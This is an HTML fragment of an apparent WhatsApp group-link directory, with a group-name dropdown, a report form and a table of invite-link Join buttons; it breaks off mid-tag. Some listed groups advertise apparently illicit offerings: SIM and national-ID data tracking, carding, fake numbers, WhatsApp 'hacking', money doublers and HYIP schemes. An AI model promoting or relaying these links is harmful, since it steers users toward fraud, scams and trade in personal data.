+    <option value="Online earning ">Online earning </option>
+                
+    <option value="Bussnies ">Bussnies </option>
+                
+    <option value="Islam is Best ">Islam is Best </option>
+                
+    <option value="Book urdu">Book urdu</option>
+                
+    <option value="Education tech">Education tech</option>
+                
+    <option value="All tv drama">All tv drama</option>
+                
+    <option value="SiM DATA TRACKERS">SiM DATA TRACKERS</option>
+                
+    <option value="Nadra database">Nadra database</option>
+                
+    <option value="Ads watch jon">Ads watch jon</option>
+                
+    <option value="PUBG ID SELLRR">PUBG ID SELLRR</option>
+                
+    <option value="مردانہ کمزوری کا علاج2⃣">مردانہ کمزوری کا علاج2⃣</option>
+                
+    <option value="Online paisy kmao">Online paisy kmao</option>
+                
+    <option value="Buy & sail pakistain">Buy & sail pakistain</option>
+                
+    <option value="Hassi tu phassi">Hassi tu phassi</option>
+                
+    <option value="Fashion Mania ">Fashion Mania </option>
+                
+    <option value="Job magazine All today job">Job magazine All today job</option>
+                
+    <option value="Heart borken">Heart borken</option>
+                
+    <option value="Muslim love">Muslim love</option>
+                
+    <option value="You tube Copyright work">You tube Copyright work</option>
+                
+    <option value="OraZon">OraZon</option>
+                
+    <option value="islamic reserch urdu 1 ">islamic reserch urdu 1 </option>
+                
+    <option value="Tarana & Hamd Status">Tarana & Hamd Status</option>
+                
+    <option value="Make Money Online">Make Money Online</option>
+                
+    <option value="Lasani group of companies">Lasani group of companies</option>
+                
+    <option value="Pak24tv">Pak24tv</option>
+                
+    <option value="♥ جوَن ایلیا 📙">♥ جوَن ایلیا 📙</option>
+                
+    <option value="Photo Editor Pro">Photo Editor Pro</option>
+                
+    <option value="Friends chatting">Friends chatting</option>
+                
+    <option value="Fake Whatsapp Number🇱🇷">Fake Whatsapp Number🇱🇷</option>
+                
+    <option value="Job magazine All today job">Job magazine All today job</option>
+                
+    <option value="Online Ëäŕńįñg">Online Ëäŕńįñg</option>
+                
+    <option value="PAK ALL IN ONE GROUP ">PAK ALL IN ONE GROUP </option>
+                
+    <option value="5️⃣ DAILY URDU NOVEL">5️⃣ DAILY URDU NOVEL</option>
+                
+    <option value="playstation digital account">playstation digital account</option>
+                
+    <option value="News funny sports">News funny sports</option>
+                
+    <option value="jobsalert & preparation">jobsalert & preparation</option>
+                
+    <option value="Tiktok and instagram followers">Tiktok and instagram followers</option>
+                
+    <option value="online earning in Pakistan without investment ">online earning in Pakistan without investment </option>
+                
+    <option value="Smart Collections">Smart Collections</option>
+                
+    <option value="Forex training courses">Forex training courses</option>
+                
+    <option value="Only sad video">Only sad video</option>
+                
+    <option value="pubg account buy and sale ">pubg account buy and sale </option>
+                
+    <option value="𝒦𝓃𝑜𝓌𝓁𝑒𝒹𝑔𝑒 1️⃣ ">𝒦𝓃𝑜𝓌𝓁𝑒𝒹𝑔𝑒 1️⃣ </option>
+                
+    <option value="✌یاراں دا گروپ ✔️">✌یاراں دا گروپ ✔️</option>
+                
+    <option value="Online jobs ">Online jobs </option>
+                
+    <option value="Sales center">Sales center</option>
+                
+    <option value="pindipoint">pindipoint</option>
+                
+    <option value="Fun ka funda ">Fun ka funda </option>
+                
+    <option value="Reselling">Reselling</option>
+                
+    <option value="Earn money with B4U">Earn money with B4U</option>
+                
+    <option value="دین اسلام">دین اسلام</option>
+                
+    <option value="Indian scandales 18+">Indian scandales 18+</option>
+                
+    <option value="𝐒𝐎𝐋𝐌𝐀𝐗">𝐒𝐎𝐋𝐌𝐀𝐗</option>
+                
+    <option value="Pubg IDs sale purchase">Pubg IDs sale purchase</option>
+                
+    <option value="Govt Jobs Pakistan Gp-3">Govt Jobs Pakistan Gp-3</option>
+                
+    <option value="News funny sports">News funny sports</option>
+                
+    <option value="🍁⃟🇫ᴀsт✤͜ 🇩Rᴀмᴀ 🇬Rouᴘ">🍁⃟🇫ᴀsт✤͜ 🇩Rᴀмᴀ 🇬Rouᴘ</option>
+                
+    <option value="Time Pass">Time Pass</option>
+                
+    <option value="Tiktok video">Tiktok video</option>
+                
+    <option value="Onlion Shop">Onlion Shop</option>
+                
+    <option value="VIP people">VIP people</option>
+                
+    <option value="Poetry group">Poetry group</option>
+                
+    <option value="Friendz zone">Friendz zone</option>
+                
+    <option value="aqib nawaz">aqib nawaz</option>
+                
+    <option value="☛⃟᭄✪🇫ʀɪᴇ🇳ᴅs✨🇿ᴏ🇳ᴇ🪂☜࿐⛓">☛⃟᭄✪🇫ʀɪᴇ🇳ᴅs✨🇿ᴏ🇳ᴇ🪂☜࿐⛓</option>
+                
+    <option value="Ladies Cosmetic & Dresses & Bags Online Shop">Ladies Cosmetic & Dresses & Bags Online Shop</option>
+                
+    <option value="I am Alone">I am Alone</option>
+                
+    <option value="Kamalia Khaddar House">Kamalia Khaddar House</option>
+                
+    <option value="TLP update">TLP update</option>
+                
+    <option value="°❀•°:🎀 poetry 🎀:°•❀°">°❀•°:🎀 poetry 🎀:°•❀°</option>
+                
+    <option value="New doubler sites">New doubler sites</option>
+                
+    <option value="Student earning ">Student earning </option>
+                
+    <option value="Online business investment plan">Online business investment plan</option>
+                
+    <option value=" Hindi song"> Hindi song</option>
+                
+    <option value="سولمیکس🏆 سےگھر🏠بیٹھے لاکھوں📱کماؤ">سولمیکس🏆 سےگھر🏠بیٹھے لاکھوں📱کماؤ</option>
+                
+    <option value="islami tiktok clips">islami tiktok clips</option>
+                
+    <option value="Online businesshere">Online businesshere</option>
+                
+    <option value="Real Earning & $Exchange ">Real Earning & $Exchange </option>
+                
+    <option value="Shopper buddy">Shopper buddy</option>
+                
+    <option value="Dubai and hyip sites investment plan">Dubai and hyip sites investment plan</option>
+                
+    <option value="Mobiles">Mobiles</option>
+                
+    <option value="BBC NEWS PAKISTAN">BBC NEWS PAKISTAN</option>
+                
+    <option value="Pubg account selling point">Pubg account selling point</option>
+                
+    <option value="Online shopping">Online shopping</option>
+                
+    <option value="Earn money online free">Earn money online free</option>
+                
+    <option value="🇵🇰☕	محفل عشق☕🇵🇰">🇵🇰☕	محفل عشق☕🇵🇰</option>
+                
+    <option value="Tik tok">Tik tok</option>
+                
+    <option value="ONLY Big invester ">ONLY Big invester </option>
+                
+    <option value="Gold state digital earn">Gold state digital earn</option>
+                
+    <option value="EARN MONEY IN USD DOLLARS">EARN MONEY IN USD DOLLARS</option>
+                
+    <option value="Learn English">Learn English</option>
+                
+    <option value="Pakistan Govt jobs 2">Pakistan Govt jobs 2</option>
+                
+    <option value="Link">Link</option>
+                
+    <option value="تحریر ">تحریر </option>
+                
+    <option value="Nts latest objectives">Nts latest objectives</option>
+                
+    <option value="مولانا طارق جمیل">مولانا طارق جمیل</option>
+                
+    <option value="Online Shopping">Online Shopping</option>
+                
+    <option value="Bet online ">Bet online </option>
+                
+    <option value="Time pass & vedios">Time pass & vedios</option>
+                
+    <option value="Online Earring">Online Earring</option>
+                
+    <option value="Trusted 200%">Trusted 200%</option>
+                
+    <option value="Mathematics class 9">Mathematics class 9</option>
+                
+    <option value="deen ke bateen">deen ke bateen</option>
+                
+    <option value="Easyload sell & buy ">Easyload sell & buy </option>
+                
+    <option value="Govt Jobs Pakistan Gp-5">Govt Jobs Pakistan Gp-5</option>
+                
+    <option value="DuK sHaRe KrY ">DuK sHaRe KrY </option>
+                
+    <option value="Friend with boys for girls">Friend with boys for girls</option>
+                
+    <option value="Enough ≈ Edit">Enough ≈ Edit</option>
+                
+    <option value="Smart X TV ">Smart X TV </option>
+                
+    <option value="Prpal adisence company ">Prpal adisence company </option>
+                
+    <option value="Give away only Pakistan">Give away only Pakistan</option>
+                
+    <option value="WEE Group">WEE Group</option>
+                
+    <option value="❤️øⁿ̃ˡᵉʏ ˢᵗᵃᵗᵘˢ 𝕠𝕗𝕗𝕚𝕔𝕚𝕒𝕝❤️💪">❤️øⁿ̃ˡᵉʏ ˢᵗᵃᵗᵘˢ 𝕠𝕗𝕗𝕚𝕔𝕚𝕒𝕝❤️💪</option>
+                
+    <option value="YOUTUBE HELP">YOUTUBE HELP</option>
+                
+    <option value="Earning for just a little click ">Earning for just a little click </option>
+                
+    <option value="Paisy kmao">Paisy kmao</option>
+                
+    <option value="Tiktok like back to back">Tiktok like back to back</option>
+                
+    <option value="Beurax global">Beurax global</option>
+                
+    <option value="Frindship group">Frindship group</option>
+                
+    <option value="Invest kr k kamao">Invest kr k kamao</option>
+                
+    <option value="Shayari status or videos">Shayari status or videos</option>
+                
+    <option value="Earn Money With Play Pubg Game">Earn Money With Play Pubg Game</option>
+                
+    <option value="Neflix Premium Accounts Sale">Neflix Premium Accounts Sale</option>
+                
+    <option value="SARA Jewelers online Shopping Artificial jewelry">SARA Jewelers online Shopping Artificial jewelry</option>
+                
+    <option value="Islamic Group ">Islamic Group </option>
+                
+    <option value="ꜰɪɴᴅ ʏᴏᴜʀ ꜱᴏᴜʟᴍᴀᴛᴇꜰɪɴᴅ ʏᴏᴜʀ ꜱᴏᴜʟᴍᴀᴛᴇ">ꜰɪɴᴅ ʏᴏᴜʀ ꜱᴏᴜʟᴍᴀᴛᴇꜰɪɴᴅ ʏᴏᴜʀ ꜱᴏᴜʟᴍᴀᴛᴇ</option>
+                
+    <option value="Health Tips Urdu">Health Tips Urdu</option>
+                
+    <option value="Islam Zindabad ">Islam Zindabad </option>
+                
+    <option value="Friendship group ">Friendship group </option>
+                
+    <option value="YouTube promotion series ">YouTube promotion series </option>
+                
+    <option value="Earn money online">Earn money online</option>
+                
+    <option value="Rajaraja group">Rajaraja group</option>
+                
+    <option value="Online earning 100%✓👍🏻">Online earning 100%✓👍🏻</option>
+                
+    <option value="Bewafa Duniya">Bewafa Duniya</option>
+                
+    <option value="Paisy kmao real">Paisy kmao real</option>
+                
+    <option value="Paisy kmao asani sy">Paisy kmao asani sy</option>
+      </select>
+  </div>
+  <div class="form-group">
+      <label for="pwd">Reason:</label>
+   <select class="form-control" id="sel1" name="reason">
+    <option value="Group is full">Group is full</option>
+    <option value="Group has been revoked">Group has been revoked</option>
+    <option value="Group does not exist">Group does not exist</option>
+  </select>
+  </div>
+    <center><button type="submit" class="btn btn-default" style="float:center;" onclick="
+     $.ajax({
+    method:'POST',
+    url:'https://www.pak24tv.com/blogs/submit_report',
+    data:$('#grform').serialize(),
+    success:function(responseText)
+    {
+      if(responseText==='1')
+      {
+         alert('Report submitted successfuly');
+         document.getElementById('grform').reset();
+      }
+    }
+ });
+    ">Submit report</button></center>
+         </form></br>
+  </div>   
+  </div></br>  
+   
+<div class="row" style="margin-top:5px;">
+<!-- Display ad-->
+
+ <ins class="adsbygoogle"
+     style="display:inline-block;width:100%;height:250px"
+     data-ad-client="ca-pub-5934710178337836"
+     data-ad-slot="3028513746"></ins>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+</script></div>
+
+<div class="tab-content">
+   <div class="tab-pane fade in active" style="width:98%;margin-left:1%;" id="All">
+        <article>
+                            <table class="table table-bordered">
+                                    <tr>
+                       <td><i>Paisy kmao asani sy</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FnN1vknDV3YFPYUc43hArg'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Paisy kmao real</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EU88JMvAgtaAsLbbd6BpzN'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Bewafa Duniya</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/4sP5txmLHIkKR12bHOFegF'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online earning 100%✓👍🏻</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/K9pxyNzV6JX9TK7qtg3d8x'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🕋🌹✒️ سنہــــــرے اوراق✒️🌹🕋</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BDYd1zjggzLKQTAl6W63wV'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>اردو ادب </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BBNgHWnKwuwGHFXVrlTnEM'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Tiktok video</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BYpH6TATFHLBWGkVPRJhiu'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>YouTube Subscriber </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JPDQ6g3CgxHLv7PaJNgutN'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Watsapp band unband group hacking</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Els3TB7Rh7D4m7SGEb5I7w'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i> Hindi song</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KKuf76VrfG90JbhIFlfIfx'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>سولمیکس🏆 سےگھر🏠بیٹھے لاکھوں📱کماؤ</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HDSia3ZYT8V7tqQN3BjVXN'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>deen ke bateen</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FqC63GvgzO77aFU1DbwNTe'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Govt Jobs Pakistan Gp-6</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JsBV1Cl4m4dK0uqtx6NdR7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Govt Jobs Pakistan Gp-5</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DJ1l7frjNTB2rDpo3SOOtj'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>DuK sHaRe KrY </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GkOO5rNewZ475Ry4GvbRXL'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Learn English</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CeX9IWyxrB7BcaJyP214GT'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Learn English</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CeX9IWyxrB7BcaJyP214GT'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>UC CARDER TRUSTED</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/COHhfPnOQInAWgIPK8cOWJ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>➖مولانا طارق جمیل ➖4⃣</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EZOwUTwJw1004USNWZ219T'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>مولانا طارق جمیل</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LUkZdthPxNNDMAPtcUof08'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Molana Tariq Jameel </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IpRjo6ZD5NG6PjKnbwIW1z'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Be rich with us</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EsAAybFpZlHK9HIwKtZHqi'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Trusted 200%</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FVK62c7xWOAFqMtSc0zJzb'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pubg prime plus shop</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Fz1I9uu0FnFAM4LcGpxSUX'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Health Tips Urdu</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Hyt7yOiE21EDMubYwdJSa8'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online business investment plan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Fa6w4eY33aLCPjMdw2FdNM'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>islamic reserch urdu 1 </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/J0lXrLn5T146GozWTaIhwu'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online shopping </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KhXjWljEO5q5A9XjoLydmK'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Sad Poetry</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Ba87KhV1FYI2AGXiGXsN7E'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pakpattan online shopping </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KhXjWljEO5q5A9XjoLydmK'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>islami tiktok clips</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BanZUfIDsD90LHVjxUSnRN'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Islamic Post For Success in Life</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DrMl4s4OgXcHSEDfnFXeak'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>💔🤎Pᴏᴛᴇʀʏ ✍️ ʟᴏᴠᴇʀs🤎💔1️⃣</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HhGP9oIGke8Kc3hiRk8a9C'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online businesshere</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CV0HevFcob15yufiarVNyf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online shopping</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KnrZGpiRUfr2m6BqLJG1T9'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>jobsalert & preparation</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/J4sflN72txSBxXCGoBvg6E'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🇵🇰☕	محفل عشق☕🇵🇰</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LX9Wn7IMvUf4xNCXNPuL7E'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pakistan Govt jobs 2</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HkODner0JVCFLWENxXeO69'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Link</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open(' ../../external.html?link=https://chat.whatsapp.com/FqhsAhiOPr66JXIJyle88B'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Yara da tola</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HAqqAGAFlJA9GsAdR6mpw5'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online Shopping</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/K0et5zgxmI66FIlmF8N5TV'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Time pass & vedios</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DQRc4jrozK4DtXtC6b8GDG'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online Earring</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HRwGtOHQjlC5LafE2BWW4J'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Friendship group </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HxoBiIddveYCiWJNCkOm99'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Islam Zindabad </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CCDafVIVsbd5b5sb8I5wWU'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Islamic Group </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GyUT1Uy8ebU2tFgKthw0KY'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>مردانہ کمزوری کا علاج2⃣</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BSOBFJRTjpFJJ4vH5mGpkZ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Online paisy kmao</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FzQSAqrzgUdB2G2jcQAanE'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Paisy kmao</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/IvEBvAMYFw755eE5WyJIXW'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Shah g ncp motors</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HLqL1sTKPBqK4vSGiTtU5v'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Tarana & Hamd Status</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/I9Fs2OcODOf4DY3rsD9Iko'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Youtube Real Subscribers </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Enk5Kz73VkRII33t4O9d0u'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>بلوچ کاروان گروپ</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ITovIiKBXsr835WWAmYli7'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Hamza</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/G7HugiBW6D7783fGs03eOP'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Only teen pubg players</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/DQdcNiDn11v8535HhV7mf9'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Geo Sindh Anmool</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GGu7KwsIcwwApt5hVrU6fx'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pakistani Drama Online</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/GiEZQDUcxHl74jLSOHTbQn'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pakistani Films Online</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KzfnA1yRvvaGAdF1ga4AZV'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Pic wa sticker</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/I3eDjPKAciCImRSfEhgNxZ'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>🌹Best Frinds♥️</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/BP4bLjyd1o0IsfbMvgcAhh'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Friendship ❤️</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KKtRYiA89XtEwzQHc8FROo'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Paying Sites 💯</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/D2GE37ICuGZ03VrNQFkruc'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Rail Sites  Full Free</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Jtasqmi4kLY2tSrhJVdnPW'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>ONLIIN EARNING </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LLLiqGeSyqOG3ibzX9KGBl'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>CRYPTO FREE SITE </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/ILh9KAam4ZN1u6qxU3EM0w'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>GRAM FREE PAYOUT </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/LZn5JYYmJAGBwYx4arPO9d'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>CRYPTO FREE REAL SITE </i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/B8CWU6q9VFo2AjEcMtoYUS'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>bayan</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/I1L0NDSahZFIhlJVLfTaWE'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>☛⃟᭄✪🇫ʀɪᴇ🇳ᴅs✨🇿ᴏ🇳ᴇ🪂☜</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/FFse9dZEHUG9DHoPBUly4I'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>☛⃟᭄✪🇫ʀɪᴇ🇳ᴅs✨🇿ᴏ🇳ᴇ🪂☜࿐⛓</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/HLDABAGI6IR8X0YpGAU12u'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>aqib nawaz</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/EuqrMb3eq3s2TUi3Fj3ZeC'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>Friendz zone</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/CHjP7bEuyzJF71WMrOo6Uf'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>°❀•°:🎀 poetry 🎀:°•❀°</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/KHXP4Dlxtt42HuNKQwsGzr'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>1 اصلاحی گروپ</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/JVYi2bpqfPr9Wfqh04qWsC'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>اصلاحی گروپ</i></td>
+<td><button class="btn btn-success" onclick="
+                       window.open('../../external.html?link=https://chat.whatsapp.com/Hz3B1ESYGiECwFLW9yWIbK'); 
+                       ">Join</button></td>                    </tr>    
+                                <tr>
+                       <td><i>UC SHOP PAKISTAN</i></td>
+<td><button class="btn btn-success" onclick="
